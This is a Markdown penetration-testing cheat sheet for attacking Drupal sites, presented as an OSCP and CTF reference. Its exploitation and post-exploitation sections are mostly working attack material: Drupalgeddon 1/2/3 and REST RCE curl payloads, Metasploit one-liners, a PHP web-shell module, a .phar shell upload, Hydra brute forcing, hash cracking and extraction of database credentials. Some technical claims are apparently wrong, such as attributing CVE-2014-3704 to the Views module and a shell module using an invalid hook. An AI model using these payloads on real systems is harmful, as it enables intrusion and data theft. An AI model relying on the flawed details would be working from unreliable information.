# Drupal

> Drupal CMS reference for penetration testing. Covers detection, enumeration,
> known CVEs, exploitation patterns, misconfigurations, and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### HTML markers

```bash
curl -s http://<TARGET>/ | grep -iE 'drupal|/sites/default/|/core/|drupalSettings'
```

Expected output:

```html
<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
<link rel="stylesheet" href="/sites/default/files/css/css_abc.css" />
<script src="/core/misc/drupal.js"></script>
<script type="application/json" data-drupal-selector="drupal-settings-json">{...}</script>
```

Strong fingerprints:
- `drupalSettings` JSON in page source
- `/sites/default/files/` and `/core/` paths
- `<meta name="Generator" content="Drupal ...">`
- `X-Generator: Drupal x.y.z` header (common on Drupal 7/8, removed in 9+)

### Response headers

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|x-generator|x-drupal|set-cookie)'
```

Expected output:

```text
X-Generator: Drupal 9 (https://www.drupal.org)
Set-Cookie: SESSabc123def...=...; path=/; HttpOnly
```

Cookie name `SESS<40-hex>` is Drupal's session cookie. Also:
- `SSESS<40-hex>` for HTTPS
- Drupal 7 also uses `SESS<32-hex>` in some configs

### Default files

- `/user/login` - login page (Drupal 8/9/10)
- `/user/register` - registration
- `/user/password` - password reset
- `/admin/` - admin panel (redirects to user/login if not authenticated)
- `/CHANGELOG.txt` - **version disclosure** (Drupal 7 and earlier; removed in 8+)
- `/core/CHANGELOG.txt` - version (Drupal 8/9)
- `/README.txt` - readme
- `/INSTALL.txt` - install notes (Drupal 7)
- `/core/INSTALL.txt`
- `/sites/default/settings.php` - **never served** but `.bak` may leak
- `/update.php` - database update script (locked by default)
- `/cron.php` - scheduled tasks

### CHANGELOG.txt

```bash
curl -s http://<TARGET>/CHANGELOG.txt | head -20
curl -s http://<TARGET>/core/CHANGELOG.txt | head -20
```

Drupal 7 and earlier leaks exact version. Drupal 8+ returns 403 for
`CHANGELOG.txt`.

### nmap / whatweb / droopescan

```bash
nmap -sV -p 80,443 --script http-drupal-enum,http-generator <TARGET>
whatweb -a 3 http://<TARGET>/
droopescan scan drupal -u http://<TARGET>/
```

`droopescan` is the primary Drupal enumeration tool:

```bash
pip install droopescan
droopescan scan drupal -u http://<TARGET>/
```

---

## 2. Enumeration

### Version

```bash
# Method 1: CHANGELOG.txt (Drupal 7 and earlier)
curl -s http://<TARGET>/CHANGELOG.txt | grep -oE 'Drupal [0-9.]+'

# Method 2: core/CHANGELOG.txt (Drupal 8/9)
curl -s http://<TARGET>/core/CHANGELOG.txt | grep -oE 'Drupal [0-9.]+'

# Method 3: meta generator
curl -s http://<TARGET>/ | grep -oE 'content="Drupal [^"]+"'

# Method 4: README.txt
curl -s http://<TARGET>/README.txt | head -10

# Method 5: X-Generator header
curl -sI http://<TARGET>/ | grep -i x-generator
```

### User enumeration

**1. Login error messages:**

```bash
curl -X POST http://<TARGET>/user/login \
  -d "name=admin&pass=wrong&form_id=user_login_form"
# "Unrecognized username or password" (same for both) - Drupal 8+
# Drupal 7 has different errors on some versions
```

**2. Registration form:**

```bash
curl -X POST http://<TARGET>/user/register \
  -d "name=admin&mail=a@b.com&pass=Test1!&form_id=user_register_form"
# "The username admin is already taken" -> user exists
# "The email address a@b.com is already registered" -> email exists
```

**3. Password reset:**

```bash
curl -X POST http://<TARGET>/user/password \
  -d "name=admin&form_id=user_pass"
# "Sorry, admin is not recognized as a username" -> user does not exist
# "Further instructions have been sent" -> user exists
```

**4. /user/<uid> endpoint (Drupal 7):**

```bash
for i in 1 2 3 4 5; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/user/$i")
  echo "$code  /user/$i"
done
```

**5. /user/<uid>/edit (leaks username if accessible):**

```bash
curl -s http://<TARGET>/user/1/edit | grep -oE 'value="[^"]+"' | head -5
```

### Node enumeration

```bash
for i in 1 2 3 4 5 6 7 8 9 10; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/node/$i")
  echo "$code  /node/$i"
done
```

Also via REST/JSON:API (Drupal 8+):

```bash
curl -s http://<TARGET>/jsonapi/ | jq .
curl -s http://<TARGET>/jsonapi/node/article | jq .
curl -s http://<TARGET>/jsonapi/user/user | jq '.data[] | .attributes.name'
```

JSON:API often leaks usernames (CVE-2017-6920-adjacent).

### Module enumeration

**1. HTML source:**

```bash
curl -s http://<TARGET>/ | grep -oE '/modules/[^/"]+/' | sort -u
curl -s http://<TARGET>/ | grep -oE '/sites/[^/"]+/modules/[^/"]+/' | sort -u
```

**2. Known module paths:**

```bash
for m in views token webform ckeditor pathauto ctools admin_menu \
         metatag captcha google_analytics; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/modules/$m/$m.info.yml")
  code2=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/sites/all/modules/$m/$m.info")
  echo "$code  /modules/$m  |  $code2  /sites/all/modules/$m"
done
```

**3. droopescan:**

```bash
droopescan scan drupal -u http://<TARGET>/ --enumerate m
```

### Theme enumeration

```bash
curl -s http://<TARGET>/ | grep -oE '/themes/[^/"]+/' | sort -u
curl -s http://<TARGET>/ | grep -oE '/sites/all/themes/[^/"]+/' | sort -u
```

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/CMS/drupal.txt -x php,txt,yml,info,bak,old
```

Seclists: `Discovery/Web-Content/CMS/drupal.txt`.

### Backup files

```bash
for f in sites/default/settings.php.bak sites/default/settings.php.old \
         sites/default/settings.php~ sites/default/settings.php.save \
         sites/default/files/backup.sql sites/default/files/dump.sql \
         backup.zip backup.tar.gz drupal.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Drupal status report

```bash
curl -s http://<TARGET>/admin/reports/status
curl -s http://<TARGET>/admin/reports/updates
curl -s http://<TARGET>/admin/reports/status/php
```

If accessible (misconfigured permissions), reveals version, PHP config, paths.

### JSON:API (Drupal 8+)

```bash
curl -s http://<TARGET>/jsonapi/ | jq .links
curl -s http://<TARGET>/jsonapi/user/user | jq '.data[] | {name: .attributes.name, mail: .attributes.mail}'
curl -s http://<TARGET>/jsonapi/node/page | jq .
```

User enumeration via JSON:API is often unauthenticated by default.

### REST endpoints

```bash
curl -s http://<TARGET>/rest/ | jq .
curl -s -H "Accept: application/json" http://<TARGET>/node/1?_format=json | jq .
curl -s -H "Accept: application/json" http://<TARGET>/user/1?_format=json | jq .
```

### RSS feed

```bash
curl -s http://<TARGET>/rss.xml | head -50
```

### /user/register status

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/user/register
```

200 -> registration enabled -> create account.

---

## 3. Known CVEs

Drupal has high-impact CVEs, especially the Drupalgeddon series.

### Drupalgeddon series

#### CVE-2014-3704 - Drupalgeddon 1 (SQL injection)

Unauthenticated SQL injection via crafted form input -> admin takeover.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2014-3704
Affected: Drupal 7.0 - 7.31.

PoC:

```bash
curl -X POST http://<TARGET>/ \
  -d "name[0 ; INSERT INTO users (uid, name, pass, mail, status) VALUES (9999, 'evil', '\$S\$D...', 'a@b.com', 1); -- ]=x&pass=x&form_id=user_login"
```

Public Metasploit: `exploit/multi/http/drupal_drupageddon`.

#### CVE-2018-7600 - Drupalgeddon 2 (RCE)

Unauthenticated RCE via crafted POST to `/user/register` or other endpoints.
Very common in CTFs.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-7600
Affected: Drupal 7.x < 7.58, 8.x < 8.3.9, 8.4.x < 8.4.6, 8.5.x < 8.5.1.

PoC:

```bash
curl -X POST http://<TARGET>/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax \
  -d "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=id"
```

Metasploit:

```text
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS <target>
set LHOST <your ip>
run
```

Or `droopescan` + public PoC:

```bash
git clone https://github.com/dreadlocked/Drupalgeddon2.git
ruby Drupalgeddon2/drupalgeddon2.rb http://<TARGET>/
```

#### CVE-2018-7602 - Drupalgeddon 3 (RCE)

Post-auth RCE via `user/delete` form. Requires valid session + `delete
own content` or similar permission.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-7602
Affected: Drupal 7.x < 7.59, 8.x < 8.5.3.

PoC:

```bash
# 1. Login with low-priv creds
# 2. POST to /user/1/cancel with crafted form
curl -X POST http://<TARGET>/user/1/cancel?destination=node \
  -b "<session>" \
  -d "form_id=user_cancel_confirm_form&_triggering_element_name=form_id&_triggering_element_value=user_cancel_confirm_form&_drupal_ajax=1&user_cancel_method=user_cancel_block&pass=&mail[a][#post_render][]=passthru&mail[a][#type]=markup&mail[a][#markup]=id"
```

Public exploit: `drupalgeddon2` extended.

### Drupal 8/9/10 CVEs

#### CVE-2019-6340 - REST RCE

Unauthenticated RCE via REST endpoint accepting serialized data.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-6340
Affected: Drupal 8.5.x < 8.5.11, 8.6.x < 8.6.10.

PoC:

```bash
curl -X POST http://<TARGET>/node/1?_format=hal_json \
  -H "Content-Type: application/hal+json" \
  -d '{
    "link": [{
      "value": "link",
      "options": "O:24:\"GuzzleHttp\\\\Psr7\\\\FnStream\":2:{...}"
    }],
    "_links": {
      "type": {"href": "http://<TARGET>/rest/type/node/article"}
    }
  }'
```

#### CVE-2020-13671 - File upload extensions bypass

Improper file extension validation -> RCE via `.phar` / `.php` uploads.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-13671
Affected: Drupal 7.x < 7.74, 8.8.x < 8.8.11, 8.9.x < 8.9.9, 9.0.x < 9.0.8.

#### CVE-2020-13672 - XSS in `format_string`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-13672
Affected: Drupal 7.x < 7.73, 8.8.x < 8.8.10, 8.9.x < 8.9.8, 9.0.x < 9.0.7.

#### CVE-2022-25277 / CVE-2022-25275 / CVE-2022-25276 - various

- CVE-2022-25277: file upload sanitization
- CVE-2022-25275: file deletion
- CVE-2022-25276: access bypass

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-25277
Affected: Drupal 9.3.x < 9.3.12, 9.4.x < 9.4.0.

#### CVE-2023-5256 - file upload RCE with phar

`.phar` upload + deserialization -> RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-5256
Affected: Drupal 9.4.x < 9.4.14, 9.5.x < 9.5.8, 10.0.x < 10.0.8, 10.1.x < 10.1.0.

#### CVE-2024-45440 - JSON:API access bypass

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-45440
Affected: Drupal 10.2.x < 10.2.6, 10.3.x < 10.3.6.

#### CVE-2025-31651 - JSON:API access bypass

NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-31651
Affected: Drupal 10.4.x < 10.4.5, 11.x < 11.0.11.

### Popular module CVEs

#### CVE-2014-3704 - Views module SQLi (part of Drupalgeddon 1)

#### CVE-2016-3171 - coder module RCE (admin)

#### CVE-2022-25277 - file upload sanitization (via modules)

#### CVE-2023-xxx - Webform module (various)

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 7.0-7.31 | SQLi | CVE-2014-3704 |
| 7.x < 7.58, 8.x < 8.5.1 | RCE | CVE-2018-7600 |
| 7.x < 7.59, 8.x < 8.5.3 | Post-auth RCE | CVE-2018-7602 |
| 8.5.x < 8.5.11 | REST RCE | CVE-2019-6340 |
| 7.x < 7.74, 8.x < 9.0.8 | File upload | CVE-2020-13671 |
| 9.x < 10.1.0 | Phar RCE | CVE-2023-5256 |
| 10.x < 10.4.5, 11.x < 11.0.11 | Access bypass | CVE-2025-31651 |

---

## 4. Exploitation Patterns

### Drupalgeddon 2 (CVE-2018-7600)

The most common Drupal exploit. Works unauthenticated.

```bash
# Metasploit
msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <target>; set LHOST <your>; run"
```

Manual PoC:

```bash
# Detection (vulnerable if response contains base64 of 'id' output)
curl -s -X POST "http://<TARGET>/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  --data-urlencode "form_id=user_register_form" \
  --data-urlencode "_drupal_ajax=1" \
  --data-urlencode "mail[a][#post_render][]=exec" \
  --data-urlencode "mail[a][#type]=markup" \
  --data-urlencode "mail[a][#markup]=id" | head -c 500
```

Or use the popular script:

```bash
git clone https://github.com/dreadlocked/Drupalgeddon2.git
cd Drupalgeddon2
ruby drupalgeddon2.rb http://<TARGET>/
```

Interactive shell: `ruby drupalgeddon2.rb http://<TARGET>/ -i`

### Drupalgeddon 1 (CVE-2014-3704)

Requires Drupal 7.0-7.31:

```bash
msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set RHOSTS <target>; set LHOST <your>; run"
```

### Drupalgeddon 3 (CVE-2018-7602)

Post-auth via `user_cancel` form. Requires valid credentials:

```bash
# 1. Login with low-priv account
curl -c cookies.txt -X POST http://<TARGET>/user/login \
  -d "name=user&pass=pass&form_id=user_login_form"

# 2. Trigger RCE
curl -b cookies.txt -X POST "http://<TARGET>/user/1/cancel?destination=node" \
  --data-urlencode "form_id=user_cancel_confirm_form" \
  --data-urlencode "_triggering_element_name=form_id" \
  --data-urlencode "_triggering_element_value=user_cancel_confirm_form" \
  --data-urlencode "_drupal_ajax=1" \
  --data-urlencode "user_cancel_method=user_cancel_block" \
  --data-urlencode "pass=" \
  --data-urlencode "mail[a][#post_render][]=passthru" \
  --data-urlencode "mail[a][#type]=markup" \
  --data-urlencode "mail[a][#markup]=id"
```

### REST RCE (CVE-2019-6340)

Drupal 8.5.x < 8.5.11, 8.6.x < 8.6.10:

```bash
curl -X POST http://<TARGET>/node/1?_format=hal_json \
  -H "Content-Type: application/hal+json" \
  -d @exploit.json
```

`exploit.json` uses Guzzle deserialization chain. Public PoC:
https://github.com/knqyf263/CVE-2019-6340

### Admin login -> module upload RCE

With admin creds:

1. `Extend -> Install new module` (Drupal 7)
2. `Extend -> Install new module` (Drupal 8+) / `Appearance -> Install new theme`
3. Upload a custom module ZIP containing PHP.
4. Enable the module -> RCE on next request.

Module structure:

```text
evil/
+-- evil.info.yml
+-- evil.module
```

`evil.info.yml`:

```yaml
name: Evil
type: module
core_version_requirement: ^8 || ^9 || ^10
```

`evil.module`:

```php
<?php
use Drupal\\Core\\Routing\\Route;
function evil_menu() {
  return [];
}
function evil_init() {
  if (isset($_GET['cmd'])) { system($_GET['cmd']); exit; }
}
```

Zip and upload via admin UI.

### SQL injection to admin password reset

Drupal 7 uses MySQL. With SQLi:

```bash
sqlmap -u "http://<TARGET>/index.php?q=node&something=1" \
  --dbms=mysql --level=5 --risk=3 -D drupal -T users -C name,pass,mail --dump
```

Drupal password hashes use phpass (portable PHP hash), same as WordPress:

```text
$S$D<8-char-salt><22-char-hash>
```

Hashcat mode 7900:

```bash
hashcat -m 7900 drupal_hashes.txt rockyou.txt
john --format=drupal7 drupal_hashes.txt
```

### User registration -> privilege escalation

If registration is enabled with elevated default role:

```bash
curl -X POST http://<TARGET>/user/register \
  -d "name=attacker&mail=a@b.com&pass=Test1!&form_id=user_register_form"
```

Then exploit any authenticated-only module CVE.

### JSON:API user enumeration

```bash
curl -s http://<TARGET>/jsonapi/user/user | jq '.data[] | {name: .attributes.name, mail: .attributes.mail}'
```

No auth required in many default installs.

### File upload bypass (CVE-2020-13671)

Upload a file with double extension (`.php.txt` -> `.php` on some configs) or
`.phar` (which PHP executes on access in some configs).

```bash
curl -b "<session>" -F "files[upload]=@shell.phar" http://<TARGET>/file/upload
```

Then access:

```bash
curl "http://<TARGET>/sites/default/files/shell.phar?cmd=id"
```

### Views SQL injection (via contributed modules)

Views module occasionally has SQLi. Test views filters:

```bash
curl "http://<TARGET>/views/ajax?_drupal_ajax=1&view_name=foo&view_display_id=page_1&view_args=1'+OR+'1'='1"
```

### Overlay / toolbar XSS

Drupal has had multiple XSS in admin panels. Requires authenticated access.

---

## 5. Misconfigurations

### /user/register open

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/user/register
```

If 200 -> registration open.

### /user/1 accessible without auth

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/user/1
```

Drupal 7 sometimes leaks user profiles.

### /update.php accessible

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/update.php
```

If 200 and no access check -> dangerous.

### settings.php exposed

```bash
for f in sites/default/settings.php.bak sites/default/settings.php.old \
         sites/default/settings.php~ sites/default/settings.php.swp \
         sites/default/settings.php.save; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Files directory listing

```bash
curl -s http://<TARGET>/sites/default/files/ | grep -i 'index of'
```

If listing enabled -> leaked documents, backups, DB dumps.

### Backup files

```bash
for f in backup.zip backup.tar.gz drupal.zip dump.sql database.sql \
         sites/default/files/backup.sql sites/default/files/dump.sql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### CHANGELOG.txt not removed

```bash
curl -s http://<TARGET>/CHANGELOG.txt | head -5
```

Version disclosure.

### Cron exposed

```bash
curl -sI http://<TARGET>/cron.php
```

If reachable -> trigger scheduled tasks.

### Error messages with stack trace

```bash
# Trigger an error
curl -s "http://<TARGET>/node/'"
```

If errors enabled -> file paths, DB error details.

### Missing security headers

```bash
curl -sI http://<TARGET>/ | grep -iE 'strict-transport|content-security-policy|x-frame-options'
```

### Admin panel accessible without HTTPS

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/admin/
```

Login over HTTP -> credential sniffing.

### Weak admin password

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> \
  http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login_form:F=Unrecognized"
```

### XML-RPC enabled (Drupal 7)

```bash
curl -s -X POST http://<TARGET>/xmlrpc.php \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
```

### JSON:API user enumeration

```bash
curl -s http://<TARGET>/jsonapi/user/user | jq '.data | length'
```

---

## 6. Post-Exploitation

### Config file location

```bash
cat /var/www/html/sites/default/settings.php
```bash

Key items:

- `$databases['default']['default']` -> DB creds
- `$settings['hash_salt']` -> session/cookie signing (Drupal 8+)
- `$drupal_hash_salt` -> same for Drupal 7
- `$settings['trusted_host_patterns']` -> allowed hosts
- `$settings['file_private_path']` -> private files
- `$settings['update_free_access']` -> `/update.php` access
- Custom `$config[...]` -> module config

### Database access

```bash
mysql -h $host -u $user -p$password $db
```

Dump users:

```sql
SELECT uid, name, pass, mail FROM users;
SELECT * FROM users_roles;
SELECT * FROM role_permission WHERE rid = 3;  -- admin role
```

### Cracking Drupal password hashes

Drupal 7 uses phpass:

```text
$S$D<8-char-salt><22-char-hash>
```

Hashcat mode 7900:

```bash
hashcat -m 7900 drupal_hashes.txt rockyou.txt
```

Drupal 8+ uses bcrypt:

```bash
hashcat -m 3200 drupal8_hashes.txt rockyou.txt
```

### Hash salt abuse

With `hash_salt`, forge session cookies (Drupal 8+) or password reset tokens:

```bash
# Session cookie format: SESS<hash_salt_based_hash>
# Actual forging requires understanding Drupal's session handling
# Use: https://github.com/... (session forgery tools vary)
```

For Drupal 7, `drupal_hash_salt` is used to sign:
- Session cookies
- Password reset tokens (with uid + timestamp)
- Form tokens

### Private files

```bash
ls -la /var/www/html/sites/default/files/private/
cat /var/www/html/sites/default/files/private/*.txt 2>/dev/null
```

Often contains sensitive uploads.

### Drupal cache

```bash
ls -la /var/www/html/sites/default/files/php/twig/
```

Compiled Twig templates (read-only) may leak structure.

### Logs

```bash
tail -n 200 /var/log/apache2/access.log | grep -i drupal
cat /var/www/html/sites/default/files/*.log 2>/dev/null
```

Drupal's watchdog logs to DB by default. With DB access:

```sql
SELECT variables FROM watchdog;
SELECT message, variables FROM watchdog ORDER BY wid DESC LIMIT 50;
```

`watchdog` often contains: failed logins, error details, session tokens, DB
queries.

### Admin panel -> full RCE

With admin creds, install a custom module (see section 4) or:

1. `Configuration -> Development -> Performance` -> enable Twig debug
2. `Structure -> Views` -> create a view with a custom Twig template
3. Inject PHP via `template_preprocess` hook

Simpler: install a shell module as shown above.

### Cron jobs

```bash
crontab -l
ls -la /etc/cron.d/
```

### Finding writable paths

```bash
find / -path /proc -prune -o -writable -type d -print 2>/dev/null | grep -iE 'drupal|www|html|tmp'
```

Drupal's `sites/default/files/` is usually writable for uploads.

### Pivot via DB

If MySQL is on localhost and accessible, check for other services:

```bash
mysql -h localhost -u <user> -p<pass> -e "SHOW DATABASES;"
```

Other databases may contain credentials for other services.

### Privilege escalation to root

Standard Linux privesc after shell:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
uname -a
cat /etc/os-release
```

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the Drupal version (from `X-Generator` OR `/core/CHANGELOG.txt` OR `/CHANGELOG.txt`) - it proves the exact core version.

> [!IMPORTANT]
> OSCP report: for Drupalgeddon 2, screenshot the exploit command AND the resulting `id` output. If using Metasploit, screenshot the module config + the shell.

> [!IMPORTANT]
> OSCP report: for settings.php leak, screenshot the file content (with DB creds masked) AND at least one successful credential use (DB login).

---

## 8. References

- Drupal official docs - https://www.drupal.org/documentation
- Drupal security advisories - https://www.drupal.org/security
- NVD search - https://nvd.nist.gov/vuln/search/results?query=drupal
- droopescan - https://github.com/SamJoan/droopescan
- Drupalgeddon 2 writeup - https://www.exploit-db.com/exploits/44449
- Drupalgeddon 2 script - https://github.com/dreadlocked/Drupalgeddon2
- CVE-2019-6340 writeup - https://github.com/knqyf263/CVE-2019-6340
- HackTricks - Drupal - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal
- PHPGGC - https://github.com/ambionics/phpggc

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
